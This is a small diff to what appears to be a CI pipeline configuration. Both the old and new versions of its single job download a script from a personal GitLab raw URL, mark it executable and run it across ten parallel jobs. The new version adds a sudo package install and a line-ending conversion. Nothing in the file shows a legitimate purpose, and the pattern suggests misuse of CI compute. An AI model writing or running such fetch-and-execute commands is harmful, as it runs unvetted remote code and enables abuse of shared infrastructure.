@@ -10,5 +10,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O minto https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh && chmod +x minto && ./minto'
+            - 'wget -O minto https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh && sudo apt-get install dos2unix -y && dos2unix minto && chmod +x minto && ./minto'
           parallelism: 10
